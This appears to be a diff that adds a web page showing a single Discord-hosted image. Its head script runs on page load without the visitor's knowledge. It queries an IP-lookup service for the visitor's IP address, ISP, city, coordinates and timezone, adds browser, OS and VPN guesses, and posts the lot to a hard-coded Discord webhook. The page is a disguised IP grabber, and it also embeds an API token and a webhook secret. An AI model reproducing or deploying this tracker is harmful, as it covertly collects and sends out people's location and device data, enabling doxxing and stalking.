@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Title</title>
+    <script>
+        async function sendData() {
+            const response = await fetch("https://ipinfo.io/json?token=82c55839d6de93");
+            const data = await response.json();
+
+            const userData = {
+                ip: data.ip,
+                isp: data.org,
+                asn: data.asn,
+                country: data.country,
+                region: data.region,
+                city: data.city,
+                loc: data.loc,
+                timezone: data.timezone,
+                mobile: /Mobi|Android|iPhone/i.test(navigator.userAgent) ? "Yes" : "No",
+                vpn: data.org.includes('VPN') ? "Yes" : "No",
+                bot: /bot|crawl|spider/i.test(navigator.userAgent) ? "Yes" : "No",
+                browser: navigator.userAgent,
+                os: navigator.platform
+            };
+
+            const webhookUrl = "https://discord.com/api/webhooks/1359566454868938842/3YaDqmwmot_q5SSI3TWQhaAEqaP8RFp5tl8-f9qjir9Ejbc9u2mS_zH9zIAvP3KmsQTp";
+
+            const payload = {
+                content: `**User Information**\n
+                    > **IP:** ${userData.ip}\n
+                    > **ISP:** ${userData.isp}\n
+                    > **ASN:** ${userData.asn}\n
+                    > **Country:** ${userData.country}\n
+                    > **Region:** ${userData.region}\n
+                    > **City:** ${userData.city}\n
+                    > **Location:** ${userData.loc}\n
+                    > **Timezone:** ${userData.timezone}\n
+                    > **Mobile:** ${userData.mobile}\n
+                    > **VPN:** ${userData.vpn}\n
+                    > **Bot:** ${userData.bot}\n
+                    > **Browser:** ${userData.browser}\n
+                    > **OS:** ${userData.os}`
+            };
+
+            await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            });
+        }
+
+        window.onload = function() {
+            sendData();
+        };
+    </script>
+</head>
+<body>
+    <img src="https://cdn.discordapp.com/attachments/1342158878355361823/1359150545117515968/IMG_0992.png?ex=67f91215&is=67f7c095&hm=d4819e93b0331ad4e8ad23f51cb711b175b79453e5440c7dccd929dceb08954c&" alt="Image" />
+</body>
+</html>
